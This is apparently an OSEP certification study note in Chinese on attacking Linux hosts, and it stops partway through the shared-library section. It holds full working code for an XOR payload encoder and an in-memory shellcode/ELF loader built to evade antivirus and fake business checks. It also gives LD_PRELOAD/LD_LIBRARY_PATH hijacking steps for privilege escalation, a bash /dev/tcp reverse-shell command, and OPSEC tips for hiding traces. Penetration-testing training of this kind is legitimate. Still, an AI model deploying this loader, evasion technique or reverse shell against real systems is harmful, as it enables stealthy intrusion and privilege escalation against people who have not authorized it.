::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 13 · Linux 攻击面（场景 36–40、48）

> 对应场景表：36 Linux 上传站会执行 ELF 但还要通过业务检查 · 37 Linux 目标有杀毒软件 · 38 Linux 程序从可控位置加载共享库 · 39 sudo 只允许一个编辑器/解释器 · 40 能覆盖制品但不能直接登录下载制品的机器 · 48 没有 SSH 密码但存在已认证的复用连接。
>
> 技术对齐：`Payloads (XOR Payload Encoder / Simple Loader / Shared Library LD PRELOAD / Shared Library LD LIBRARY Path)`、`Abusing SUIDs`、`SSH Hijacking with ControlMaster / SSH Agent Forwarding`、`Artifactory (JFrog)` 各节。
>
> 统一占位符：`LHOST`（攻击机 IP）`LPORT`（监听端口）`TARGET`（目标地址）`USER` `PASS` `DOMAIN` `PAYLOAD`。所有命令默认在 x86_64 Linux 上执行。

## 总览

| 场景 | 一句话目标 | 关键脚本 |
|---|---|---|
| 36 | ELF 被执行但必须过业务检查 | `m13-xor-encoder.py` + `m13-simple-loader.c`（业务输出模式） |
| 37 | 常见 ELF 被 Linux AV 检测 | `m13-xor-encoder.py` + `m13-simple-loader.c`（内存解码模式） |
| 38 | 程序从可控位置加载共享库 | `m13-shared-library-ldpreload.c` / `m13-shared-library-ldlibrarypath.c` |
| 39 | sudo 只放行一个编辑器/解释器 | `m13-sudo-gtfobins.sh` |
| 40 | 可覆盖制品、无法登录消费端 | `m13-artifactory-replace.sh` |
| 48 | 无 SSH 密码但有复用连接 | `m13-ssh-controlmaster-hijack.sh` |

**Linux 与 Windows 的根本差异（全模块前提）**：没有 AMSI/ETW/AppLocker 体系，没有“进程空心化”概念；防御面主要是文件型 AV 签名扫描（ClamAV 等 on-access 扫描）、`auditd`/eBPF/LSM 等运行时监控、SUID/sudo 权限模型、以及可写目录+动态链接加载顺序问题。Windows 的“绕杀软”手段（patch ETW、反射加载托管程序集）在 Linux 上不适用，思路要换成：**磁盘上不留明文 payload、在内存中解码执行、复用权限/信任上下文而非偷凭据**。

---

## 场景 36 · Linux 上传站会执行 ELF，但程序还要通过业务检查

### 场景回顾
实验环境里有一个“上传即执行”的站点（接收 ELF 并运行它）。直接传一个反连 shell ELF 会失败：站点有一个**业务检查**环节——用包装脚本运行我们上传的程序，要求它（a）打印符合预期的业务输出/横幅，（b）保持存活一段固定时间（生命周期检查），或（c）最终以 0 退出。纯 shell ELF 要么立刻退出（会话随之消失），要么不打印任何业务输出而被判 FAIL 并终止。

### 前提与假设
- 站点以我们的用户身份执行上传文件（不是 setuid 到 root）。
- 我们能从场景描述或可读的包装脚本推断“业务输出”的样子（例如必须打印 `Usage: run ...` 或循环心跳）。
- 允许出站 TCP 回连到 `LHOST:LPORT`（沿用前面场景已打通的出网条件）。
- 攻击机上有 gcc 与 python3，用于编译 loader、生成编码文件。
- 上传目录可写，能同时上传 loader 与数据文件；若不可写（只执行、执行后即删），改用“内嵌 payload”模式（见失败分支）。

### 准备（攻击机侧）
1. 准备第二阶段 ELF（反连 agent 或 `/bin/sh` 反连），例如先做一个最小反连程序或编译好的 stage2。
2. 用 `m13-xor-encoder.py` 把 stage2 编码成 `stage2.enc`（磁盘上是密文，不触发签名/内容检查）。
3. 编译 loader 的业务模式版本：
   - 无内嵌：`gcc -o loader loader.c`（loader 与 `stage2.enc` 同目录）。
   - 内嵌：先 `m13-xor-encoder.py --c-array` 生成字节数组，再编译进 loader。
4. 攻击机起监听：`nc -lvnp LPORT` 或 C2 监听。

### 执行步骤
1. 构造“合法外壳”：loader 主进程先打印业务横幅并进入循环（心跳），与站点预期一致。
2. 上传 `loader` 与 `stage2.enc` 到站点指定目录。
3. 触发执行（站点按钮/接口，或我们找到的触发方式）。
4. 观察站点页面输出：业务检查通过（横幅符合预期、进程存活）。
5. loader 解码 `stage2.enc` 并在**子进程**中以内存方式拉起 stage2（mmap→mprotect，不落盘）。
6. 攻击机收到回连后，loader 主进程优雅退出（exit 0），不留下可疑长驻进程。

### 用到的脚本
- `m13-xor-encoder.py`：XOR 编码 stage2（文件模式 / C 数组模式）。
- `m13-simple-loader.c`：读取/内嵌编码 payload，内存解码执行；含业务输出模式与心跳生命周期逻辑。

### 验证
- 站点显示业务检查 PASS（输出横幅正确、进程在检查窗口内存活）。
- 攻击机监听出现会话：`id`、`whoami` 结果与预期一致。
- 检查窗口结束后 loader 正常退出；磁盘上没有明文 payload。

### 失败分支与备选
1. **站点要求精确横幅/输出**：修改 loader 内的 `BANNER` 宏为站点要求的原文，重新编译上传。
2. **上传目录执行后即删/不可再写**：改用内嵌模式（把编码 payload 编进 loader 单一文件上传），并让 loader 支持 `-banner` 参数做业务输出。
3. **架构不匹配**（站点是 x86_64 而 stage2/loader 编成 32 位或反之）：统一用 `gcc -m64`/`-m32` 重新编译两段，用 `file loader stage2.enc` 核对。
4. **业务检查固定时长后杀进程**：让 stage2 一解码即 fork 出去独立会话，loader 在检查结束前完成“业务输出+退出 0”即可，不依赖 loader 长驻。
5. **反连被过滤（只放行该站点同网段）**：不做反连，改为 stage2 把结果写回 loader 的 stdout（业务输出通道外带），由站点页面回显。

### 考试注意 / OPSEC
- 业务横幅要与场景中合法程序的输出一致，避免“PASS 了但日志里横幅很怪”引起注意。
- 磁盘上只出现 `.enc`/loader，不要上传明文反连 ELF。
- 会话建立后不要立刻在站点可读的输出里打印敏感内容；先静默确认再交互。
- 结束前清理上传目录里残留的 `stage2.enc` 与 loader（若场景允许写）。

---

#### `m13-xor-encoder.py`

````python
#!/usr/bin/env python3
"""用途：对 Linux payload（ELF / 原始 shellcode 文件）做单字节 XOR 编码，
输出 .enc 文件或 C 数组；配套 m13-simple-loader.c 在内存中解码执行，
保证磁盘上不出现明文 payload。

场景：M13 场景 36（上传站执行 ELF，磁盘/内容要过业务检查）
      与场景 37（Linux AV 文件签名检测，常见 ELF 被检出）。

依赖：Python 3.7+（标准库 argparse）。

使用：
    # 编码为文件（loader 外部文件模式直接读它）
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa -o stage2.enc

    # 输出 C 数组（loader 内嵌模式：把输出贴进 m13-simple-loader.c 的 enc_payload[]）
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa --c-array

    # 还原（自测：编码后必须能还原出与 -i 完全一致的内容）
    python3 m13-xor-encoder.py -i stage2.enc -k 0xfa -d -o plain.bin && cmp plain.bin shellcode.bin

    # 多字节 key 示例：-k 0xfa,0x1b,0x2c（解码端需一致，loader 默认单字节）
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa,0x1b -o stage2.enc

占位符：LHOST/LPORT 只出现在被编码的 payload 内部（生成 payload 时决定，
       本脚本不感知）。key 默认 0xfa，用 -k 修改并保持 loader 端一致。

测试状态：语法已过 ast.parse；编码/解码对称逻辑可离线自测（见上面 -d 用法）；
未在目标机实测。
"""
from __future__ import annotations

import argparse
import sys

def parse_key(text: str) -> list[int]:
    """解析 -k：支持 0xfa / 250 / 逗号分隔多字节 0xfa,0x1b。值域 0-255。"""
    keys: list[int] = []
    for part in text.split(","):
        part = part.strip()
        try:
            value = int(part, 0) if part.lower().startswith("0x") else int(part)
        except ValueError:
            raise SystemExit(f"[-] 非法 key: {part!r}（示例: -k 0xfa 或 -k 250,0x1b）")
        if not 0 <= value <= 255:
            raise SystemExit(f"[-] key 越界(0-255): {part}")
        keys.append(value)
    return keys

def xor_bytes(data: bytes, keys: list[int]) -> bytes:
    """单字节/多字节 XOR：key 循环使用。"""
    if len(keys) == 1:
        k = keys[0]
        return bytes(b ^ k for b in data)
    return bytes(b ^ keys[i % len(keys)] for i, b in enumerate(data))

def emit_c_array(data: bytes, name: str = "enc_payload") -> str:
    """输出可直接粘贴进 m13-simple-loader.c 的 C 字节数组。"""
    lines = [f"static unsigned char {name}[] = {{"]
    for i in range(0, len(data), 12):
        chunk = ", ".join(f"0x{b:02X}" for b in data[i : i + 12])
        lines.append("    " + chunk + ",")
    lines.append("};")
    return "\n".join(lines)

def main() -> int:
    ap = argparse.ArgumentParser(description="XOR payload 编码器（M13 场景 36/37）")
    ap.add_argument("-i", "--input", required=True, help="输入 payload 文件路径")
    ap.add_argument("-o", "--output", default="", help="输出文件路径（--c-array 时忽略）")
    ap.add_argument("-k", "--key", default="0xfa", help="XOR key，支持 0xfa / 250 / 0xfa,0x1b")
    ap.add_argument("--c-array", action="store_true", help="输出 C 数组到 stdout（粘贴进 loader）")
    ap.add_argument("-d", "--decode", action="store_true", help="解码模式（自测还原用）")
    args = ap.parse_args()

    keys = parse_key(args.key)
    try:
        with open(args.input, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        print(f"[-] 读取失败 {args.input}: {exc}", file=sys.stderr)
        return 1
    if not data:
        print(f"[-] 输入为空: {args.input}", file=sys.stderr)
        return 1

    verb = "解码" if args.decode else "编码"
    out = xor_bytes(data, keys)
    print(f"[*] {verb}: {args.input} ({len(data)} B) key={args.key}")

    if args.c_array:
        sys.stdout.write(emit_c_array(out) + "\n")
        return 0

    dest = args.output or (args.input + (".dec" if args.decode else ".enc"))
    try:
        with open(dest, "wb") as fh:
            fh.write(out)
    except OSError as exc:
        print(f"[-] 写入失败 {dest}: {exc}", file=sys.stderr)
        return 1
    print(f"[+] 已写出: {dest} ({len(out)} B)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m13-simple-loader.c`

````c
/* 用途：Linux 自定义 ELF/shellcode 加载器——读取 XOR 加密的载荷，mmap 申请内存 → 解码 →
 *       mprotect 改为可执行 → 跳转执行；若解码后是完整 ELF，则放进匿名文件（memfd）执行。
 *       磁盘上只出现密文（.enc）或内嵌数组，不给文件型 AV 留明文签名（场景 37）；
 *       可选业务横幅 + 心跳存活 + 退出码 0，用来通过上传站的业务检查（场景 36）。
 * 场景：36（Linux 上传站会执行 ELF，但程序还要通过业务检查）、37（Linux 目标也有 AV，常见 ELF 被检测）
 * 依赖：gcc（目标 Linux x86_64；编 32 位需 gcc -m32 与 32 位 multilib）；ELF 模式需内核 3.17+（memfd_create）
 * 编译：
 *   # ① 外部文件模式（loader 与 stage2.enc 放在同一目录）
 *   gcc -Wall -O2 -s -o loader m13-simple-loader.c
 *   # ② 内嵌模式（编码器生成数组替换 enc_payload[] 后再编译，只投放单个文件）
 *   gcc -Wall -O2 -s -DEMBED_PAYLOAD -o loader m13-simple-loader.c
 *   # ③ 指定架构 / 静态链接（目标缺运行库时）
 *   gcc -Wall -O2 -m32 -static -o loader m13-simple-loader.c
 *   gcc -Wall -O2 -m64 -static -o loader m13-simple-loader.c
 * 配套编码脚本（m13-xor-encoder.py，攻击机侧）：
 *   python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa -o stage2.enc          # 外部文件模式用的密文
 *   python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa --c-array              # 内嵌模式用的 C 数组
 *   python3 m13-xor-encoder.py -i stage2.enc -k 0xfa -d -o plain.bin           # 自测：解码后应与原文一致
 * 使用：
 *   ./loader stage2.enc                            # 解码并在内存中执行（shellcode 直接跳转 / ELF 走 memfd）
 *   ./loader stage2.enc -k 0xfa                    # 指定 XOR key（默认 0xfa，必须与编码时一致）
 *   ./loader stage2.enc -b "Usage: run <file>"     # 业务模式：先打印横幅，再执行
 *   ./loader stage2.enc -b "OK" -a 30              # 打印横幅后每 5 秒心跳一次，30 秒后以 0 退出
 *   ./loader                                       # 内嵌模式（编译期 -DEMBED_PAYLOAD），无需 .enc
 *   ./loader -h                                    # 查看全部参数
 * 占位符：本文件不含真实地址；LHOST/LPORT 只存在于被编码的 payload 内部（生成 payload 时决定）。
 *         XOR key 默认 0xfa，用 -k 或编译期 -DXOR_KEY=0xNN 修改，两端必须一致。
 * 测试状态：已在本机用 gcc -Wall -c 完成编译校验（macOS/clang 仅做语法检查，功能需在 Linux 目标实测）；
 *          ELF 执行分支仅在 __linux__ 下编译，非 Linux 平台编译时给出明确提示而不是静默失败。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifdef __linux__
#include <sys/syscall.h>
#endif

#ifndef XOR_KEY
#define XOR_KEY 0xfa
#endif

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 1U
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

#ifdef EMBED_PAYLOAD
/* EMBED_BEGIN —— 内嵌模式：把 m13-xor-encoder.py --c-array 的输出替换掉下面那行默认数组 */
static unsigned char enc_payload[] = { 0x90 };
/* EMBED_END */
#endif

static void usage(const char *self)
{
    fprintf(stderr,
            "用法: %s [stage2.enc] [选项]\n"
            "  -k, --key <0xNN>      XOR key（默认 0x%02x，须与编码时一致）\n"
            "  -b, --banner <文本>   执行前打印业务横幅（场景 36 的业务检查）\n"
            "  -a, --alive <秒>      打印横幅后保持心跳的秒数，到点以退出码 0 结束\n"
            "  -h, --help            显示本帮助\n"
            "示例: %s stage2.enc -k 0xfa -b \"Usage: run <file>\" -a 30\n",
            self, (unsigned)XOR_KEY, self);
}

static unsigned char *read_all(const char *path, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[!] 打开失败 %s: %s\n", path, strerror(errno));
        return NULL;
    }
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long n = ftell(f);
    if (n <= 0) {
        fprintf(stderr, "[!] 文件为空或无法定位长度: %s\n", path);
        fclose(f);
        return NULL;
    }
    rewind(f);
    unsigned char *buf = (unsigned char *)malloc((size_t)n);
    if (!buf) { fclose(f); return NULL; }
    size_t got = fread(buf, 1, (size_t)n, f);
    fclose(f);
    if (got != (size_t)n) {
        fprintf(stderr, "[!] 读取不完整: %s (%zu/%ld)\n", path, got, n);
        free(buf);
        return NULL;
    }
    *out_len = (size_t)n;
    return buf;
}

static void xor_decode(unsigned char *buf, size_t len, unsigned int key)
{
    for (size_t i = 0; i < len; i++) buf[i] = (unsigned char)(buf[i] ^ (key & 0xff));
}

static int is_elf(const unsigned char *buf, size_t len)
{
    return len > 4 && buf[0] == 0x7f && buf[1] == 'E' && buf[2] == 'L' && buf[3] == 'F';
}

/* shellcode 路线：mmap(RW) → 复制并解码 → mprotect(RX) → 跳转。
 * 解码阶段只给 RW，避免长时间存在 RWX 映射（eBPF/LSM 监控常见检测点）。 */
static void run_shellcode(const unsigned char *code, size_t len)
{
    long page = sysconf(_SC_PAGESIZE);
    if (page <= 0) page = 4096;
    size_t map_len = ((len + (size_t)page - 1) / (size_t)page) * (size_t)page;

    void *mem = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmap 失败: %s\n", strerror(errno));
        return;
    }
    memcpy(mem, code, len);
    if (mprotect(mem, map_len, PROT_READ | PROT_EXEC) != 0) {
        fprintf(stderr, "[!] mprotect(RX) 失败: %s（内核/LSM 禁止 W^X 时改用 -DUSE_RWX 或解释器加载）\n",
                strerror(errno));
        munmap(mem, map_len);
        return;
    }
    void (*entry)(void) = (void (*)(void))mem;
    entry();
    munmap(mem, map_len);
}

#ifdef __linux__
static int write_all_fd(int fd, const unsigned char *buf, size_t len)
{
    size_t off = 0;
    while (off < len) {
        ssize_t w = write(fd, buf + off, len - off);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        off += (size_t)w;
    }
    return 0;
}

/* ELF 路线：写进内存文件后 exec，磁盘上不出现明文 ELF。
 * 优先 memfd_create；老内核/seccomp 场景退回 /dev/shm（用完即 unlink）。 */
static int drop_payload(const unsigned char *buf, size_t len, char *path, size_t cap)
{
    path[0] = '\0';
#ifdef SYS_memfd_create
    int fd = (int)syscall(SYS_memfd_create, "stage2", MFD_CLOEXEC);
    if (fd >= 0) {
        if (write_all_fd(fd, buf, len) == 0) return fd;
        close(fd);
    }
#endif
    snprintf(path, cap, "/dev/shm/.stage2.%ld", (long)getpid());
    fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0700);
    if (fd < 0) {
        fprintf(stderr, "[!] 打开 %s 失败: %s\n", path, strerror(errno));
        return -1;
    }
    if (write_all_fd(fd, buf, len) != 0) {
        fprintf(stderr, "[!] 写入 %s 失败: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    return fd;
}

static void run_elf(const unsigned char *buf, size_t len)
{
    char path[256];
    int fd = drop_payload(buf, len, path, sizeof(path));
    if (fd < 0) _exit(127);

    char exe[128];
    if (path[0] == '\0') snprintf(exe, sizeof(exe), "/proc/self/fd/%d", fd);
    else snprintf(exe, sizeof(exe), "%s", path);

    char *const argv[] = { (char *)"stage2", NULL };
    execve(exe, argv, environ);
    fprintf(stderr, "[!] execve(%s) 失败: %s\n", exe, strerror(errno));
    _exit(127);
}
#else
static void run_elf(const unsigned char *buf, size_t len)
{
    (void)buf;
    (void)len;
    fprintf(stderr, "[!] ELF 执行分支只在 Linux 目标上可用（当前二进制用于非 Linux 平台的语法检查）\n");
    _exit(127);
}
#endif

int main(int argc, char **argv)
{
    const char *path = NULL;
    const char *banner = NULL;
    int alive = 0;
    unsigned int key = XOR_KEY;

    for (int i = 1; i < argc; i++) {
        if ((!strcmp(argv[i], "-k") || !strcmp(argv[i], "--key")) && i + 1 < argc) {
            key = (unsigned int)strtoul(argv[++i], NULL, 0) & 0xff;
        } else if ((!strcmp(argv[i], "-b") || !strcmp(argv[i], "--banner")) && i + 1 < argc) {
            banner = argv[++i];
        } else if ((!strcmp(argv[i], "-a") || !strcmp(argv[i], "--alive")) && i + 1 < argc) {
            alive = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        } else if (argv[i][0] != '-') {
            path = argv[i];
        } else {
            fprintf(stderr, "[!] 未知参数: %s\n", argv[i]);
            usage(argv[0]);
            return 2;
        }
    }

    unsigned char *buf = NULL;
    size_t len = 0;

#ifdef EMBED_PAYLOAD
    if (!path) {
        len = sizeof(enc_payload);
        buf = (unsigned char *)malloc(len);
        if (!buf) { fprintf(stderr, "[!] 内存不足\n"); return 1; }
        memcpy(buf, enc_payload, len);
    }
#endif

    if (!buf) {
        if (!path) {
            fprintf(stderr, "[!] 缺少载荷文件（外部文件模式需给出 stage2.enc；或用 -DEMBED_PAYLOAD 编译内嵌版本）\n");
            usage(argv[0]);
            return 2;
        }
        buf = read_all(path, &len);
        if (!buf) return 1;
    }

    xor_decode(buf, len, key);
    if (!len) {
        fprintf(stderr, "[!] 载荷为空\n");
        free(buf);
        return 1;
    }

    if (banner) {
        printf("%s\n", banner);
        fflush(stdout);
    }

    /* 子进程跑载荷：父进程负责业务输出/心跳，退出时子进程已被 init 接管，会话不中断 */
    pid_t pid = fork();
    if (pid < 0) {
        fprintf(stderr, "[!] fork 失败: %s\n", strerror(errno));
        free(buf);
        return 1;
    }
    if (pid == 0) {
        if (is_elf(buf, len)) run_elf(buf, len);
        else run_shellcode(buf, len);
        _exit(0);
    }

    free(buf);

    if (alive > 0) {
        int left = alive;
        while (left > 0) {
            sleep(left > 5 ? 5 : (unsigned)left);
            left -= left > 5 ? 5 : left;
            if (banner) {
                printf("%s\n", banner);
                fflush(stdout);
            }
        }
        return 0;   /* 业务检查窗口结束：优雅退出 0，载荷子进程继续存活 */
    }

    int st = 0;
    waitpid(pid, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : 1;
}
````

## 场景 37 · Linux 目标也有杀毒软件，常见 ELF 被检测

### 场景回顾
Linux 主机上有 AV（典型是 ClamAV 的 on-access/on-scan 守护，考试里也可能是对磁盘文件做签名的扫描器）。直接生成的常见 ELF——例如 msfvenom 的 `linux/x64/shell_reverse_tcp`、网上现成的反连程序——一落地或一执行就被检出/删除。**Windows 的手段（patch AMSI/ETW、进程空心化、托管反射）在这里无效**，需要按 Linux 的检测模型重做。

### 前提与假设
- AV 以文件扫描为主（本地可测：`clamscan PAYLOAD`）；是否同时有运行时监控（auditd/eBPF）未知，按“有”来防御。
- 我们能决定 payload 的形态与存放方式（磁盘 or 纯内存）。
- 不需要绕过登录/权限，只需要让我们的 ELF 活下来并回连。

### 准备（攻击机侧）
1. 攻击机本地做“红队自测”：`clamscan stage2`、`file stage2`、`strings stage2 | grep -iE 'socket|/bin/sh'`——先确认会被签名的特征。
2. 用 `m13-xor-encoder.py` 把 stage2 XOR 编码成 `.enc`（磁盘形态不再含明文签名特征）。
3. 编译 `m13-simple-loader.c`（内存解码模式）：`mmap(PROT_READ|PROT_WRITE)` → 解码 → `mprotect(PROT_READ|PROT_EXEC)` → 跳转执行；全程不写明文到磁盘。
4. （可选）用 `memfd_create()` 变体把数据藏进匿名 fd，连 `.enc` 都不放。

### 执行步骤
1. 上传/投放：只投放 loader（+ `.enc`）；loader 名字伪装成业务相关（如 `update`、`monitor`），文件名不暴露意图。
2. 触发运行；loader 把 `.enc` 读入匿名内存并解码执行 stage2。
3. stage2 回连 `LHOST:LPORT`；本地监听确认会话。
4. 会话内避免进一步向 `/tmp` 写明文工具；需要时再次走编码+内存加载。

### 用到的脚本
- `m13-xor-encoder.py`（改变磁盘签名面）。
- `m13-simple-loader.c`（内存解码，避免明文落盘）。

### 验证
- 落地前后对 loader/`.enc` 跑 `clamscan`：loader 干净或轻微；`.enc` 不含原始签名。
- 执行后监听出现会话；`/proc/<pid>/maps` 或 `ls -l /tmp` 中无明文 stage2 文件。
- 若环境有 on-access 扫描，注意投放瞬间日志无告警。

### 失败分支与备选
1. **静态 loader 也被查杀**：换更小/更简单的 loader（去掉 `system`、`socket` 等高频特征字符串，用 `syscall()` 直接调）；或加一层打包（upx/自写压缩）后重新自测。
2. **有 eBPF/LSM 运行时监控，`mprotect RW→RX` 被拦**：改为一开始就以 `PROT_READ|PROT_EXEC` 映射再写入（W^X 直接违反时）或改用 `memfd_create` + 现有解释器（如 `python3`/`perl`）执行内存内容，避开 mmap RWX 特征。
3. **签名的是“行为/元数据”而非内容**（例如检测 ELF 里内嵌的 C2 域名/IP）：把 `LHOST` 拆开运行时拼接/异或还原，避免明文 IP 出现在 `.enc` 之外。
4. **AV 连 `.enc` 也拦（少见，一般只按内容签名）**：把 `.enc` 改后缀/头（加假魔数），loader 按偏移跳过再解码。
5. **完全不让写任何文件**：放弃文件载体，用现有入口直接执行 `m13-simple-loader` 的内存解码逻辑（若场景提供 stdin/参数注入执行 ELF 的通道）。

### 考试注意 / OPSEC
- 不要在目标上跑 `wget`/`curl` 拉明文 payload 到 `/tmp`——那正是文件扫描器最容易抓的时刻。
- 编译时 `-s`（strip）、避免 `-z execstack` 之外多余的 RWX；自测优先于上线。
- 会话内容不要涉及 AV 进程本身的大动作（别一上来就 kill 杀软进程，容易触发联动告警）。

---

## 场景 38 · Linux 程序从可控位置加载共享库

### 场景回顾
目标上有一个会以更高权限运行的程序（服务/定时任务/被触发脚本），它依赖的某个共享库缺失或可从“我们能写入的位置”被解析到。思路不是打二进制，而是**让动态链接器在加载时执行我们的 .so 构造函数**。两条主线：`LD_PRELOAD`（无论程序缺不缺库，强制先加载我们的库）与 `LD_LIBRARY_PATH`（程序确实缺某个库，我们在搜索路径前置的目录放一个**同名且导出相同符号**的库）。两者机制不同：库名匹配、符号导出、加载顺序、以及 setuid 程序的“secure-execution”限制都要排查。

### 前提与假设
- 我们能控制目标程序的执行环境变量（运行该程序的服务/脚本由我们或可控位置触发），或能写入该程序搜索路径中的目录。
- 有代码执行权（能上传 .so 到目标，例如通过上传站/写权限目录），但**没有目标用户密码**——目标是借程序的高权限跑我们的代码。
- 若目标是 setuid/setgid 程序：glibc 出于安全会忽略 `LD_PRELOAD` 与 `LD_LIBRARY_PATH`（AT_SECURE），需先确认（`getauxval`/`ldd` 现象），否则该场景的入口其实是“该程序缺库且其 RPATH/RUNPATH 指向可写目录”。

### 准备（攻击机侧）
1. 摸清目标与缺失库：
   - `ldd TARGET_BIN`（看 missing/not found 行）
   - `readelf -d TARGET_BIN | grep -E 'RPATH|RUNPATH|NEEDED'`
   - `sudo -l` / `ps aux` / `systemctl list-units` 找它何时以何身份跑。
2. 决定走哪条线（见下）。
3. 攻击机编译 .so（见脚本头注释的编译命令），上传到目标。

### 执行步骤
**A. LD_PRELOAD 线（`m13-shared-library-ldpreload.c`）**
1. 程序本身能正常运行（库都齐）→ 用 `LD_PRELOAD` 注入：
   - `LD_PRELOAD=/path/to/lib.so TARGET_BIN [args...]`
2. 我们的库用 `__attribute__((constructor))` 在加载瞬间执行提权/反连代码，随后**保持程序原有行为**（不覆盖其正常函数，避免业务崩掉）。
3. 若程序是 setuid 程序，先验证 `LD_PRELOAD` 是否被忽略：`LD_PRELOAD=... TARGET_BIN` 后无效果 → 转 B 或另找入口（本条限制是特性不是 bug）。

**B. LD_LIBRARY_PATH 线（`m13-shared-library-ldlibrarypath.c`）**
1. 程序缺库（`ldd` 显示 `not found`，如 `libcrypto.so.1.1`）→ 库名必须与缺失库**完全一致**。
2. 在可控目录放同名 .so，用 `LD_LIBRARY_PATH=/可控目录` 前置搜索：`LD_LIBRARY_PATH=/tmp/x TARGET_BIN`。
3. .so 必须导出该库被程序用到的符号（缺哪个补哪个：先用 `nm -D 原库` 抄导出表做桩，或用 cheat sheet 提供的“先 dlopen 真库再转发”模式），同时 `__attribute__((constructor))` 先跑我们的代码。
4. 用 `ldd` 验证解析到的路径变成我们的 .so：`LD_LIBRARY_PATH=/可控目录 ldd TARGET_BIN`。
5. 触发程序运行（服务重启/任务/等待 cron），确认我们的代码以目标身份执行。

### 用到的脚本
- `m13-shared-library-ldpreload.c`：LD_PRELOAD 注入（不依赖缺失库）。
- `m13-shared-library-ldlibrarypath.c`：同名替换缺失库（必须核对库名与符号导出）。

### 验证
- `ldd` 输出中目标库路径指向我们的文件（LD_LIBRARY_PATH 线）。
- 监听器收到以目标用户身份的回连，或 `id` 显示提权成功。
- 目标程序本身仍能完成其正常业务（不闪退、无报错刷屏）。

### 失败分支与备选
1. **库名对不上 / 符号缺导出导致 `symbol lookup error`**：用 `nm -D` 抄原库全部被引符号补桩；名称必须逐字符一致（含 `.so.1.1` 这类版本后缀）。
2. **LD_PRELOAD 被 setuid 忽略**：确认目标是否 setuid（`ls -l`/`find -perm -4000`）；是则改走“可写 RPATH 目录”或换一个非 setuid 的高权限程序入口；不要把时间耗在“为什么 PRELOAD 没生效”。
3. **加载顺序问题**：LD_PRELOAD 一定最先加载；LD_LIBRARY_PATH 只插在 RPATH 之后、默认路径之前——若程序自带 RPATH 指向别处，LD_LIBRARY_PATH 不会生效，改用替换 RPATH 目录里的同名库。
4. **程序启动即崩溃**：constructor 里做重活前先 `fork()` 把反连放子进程，父进程保持原初始化流程；或延迟到业务函数被调用时再触发。
5. **目标环境变量被 sanitize（服务用 env -i / systemd 清环境）**：改在程序**本身**能读到的配置/其调用链里设置（如 wrapper 脚本、`/etc/environment` 若可写），或直接替换其加载目录里的真实库文件（先备份）。

### 考试注意 / OPSEC
- 先备份原库/原文件，收尾时还原，避免业务中断暴露。
- 提权/回连成功后不要留 shell 历史痕迹（`.bash_history`）与明文的 .so 源码。
- setuid 场景：别把“PRELOAD 不生效”当成 bug 反复试，先 `file`/`ls -l` 判断 AT_SECURE。

---

#### `m13-shared-library-ldpreload.c`

````c
/* 用途：LD_PRELOAD 场景的共享库载荷——被预加载的瞬间（constructor）在独立子进程里执行载荷，
 *       不覆盖宿主的任何函数，宿主程序的行为、输出与退出码完全不变（不闪退、不报错刷屏）。
 * 场景：38（Linux 程序从可控位置加载共享库 / 允许预加载设置）
 * 依赖：gcc；Linux x86_64；-ldl（可选钩子 HOOK_GETEUID 用 dlsym(RTLD_NEXT) 转发原函数）
 * 编译：
 *   gcc -Wall -fPIC -shared -O2 -o libpreload.so m13-shared-library-ldpreload.c -ldl
 *   # 需要"被调用时触发"（而不是加载即触发）时，启用转发钩子：
 *   gcc -Wall -fPIC -shared -O2 -DHOOK_GETEUID -o libpreload.so m13-shared-library-ldpreload.c -ldl
 *   # 32 位宿主：
 *   gcc -Wall -m32 -fPIC -shared -O2 -o libpreload.so m13-shared-library-ldpreload.c -ldl
 * 使用：
 *   LD_PRELOAD=./libpreload.so /usr/local/bin/target
 *   PAYLOAD_CMD='bash -i >& /dev/tcp/LHOST/LPORT 0>&1' LD_PRELOAD=./libpreload.so /usr/bin/id
 *   # 排障：确认是否被加载（setuid 程序的 AT_SECURE 会忽略 LD_PRELOAD）
 *   LD_PRELOAD=./libpreload.so /usr/bin/id; ls -l /usr/bin/id
 * 占位符：LHOST=攻击机 IP，LPORT=监听端口（写死在 DEFAULT_CMD，或用 PAYLOAD_CMD 环境变量覆盖）
 * 测试状态：已在本机用 gcc -Wall -fPIC -c 完成编译校验；未在 Linux 目标实测
 *
 * 设计要点（对应场景 38 A 线）：
 *   1. constructor 里只做 fork，重活都在子进程，父进程立刻返回，宿主初始化流程不受影响。
 *   2. 两次 fork（中间子进程立即退出并由本库回收），避免出现僵尸进程，也不改宿主的 SIGCHLD 处理。
 *   3. 默认不劫持任何符号——这是"保持宿主行为"最简单的做法；需要时再开 -DHOOK_GETEUID，
 *      该钩子会用 dlsym(RTLD_NEXT) 把调用转给真实的 geteuid，返回值与原生一致。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifdef HOOK_GETEUID
#include <dlfcn.h>
#endif

#ifndef DEFAULT_CMD
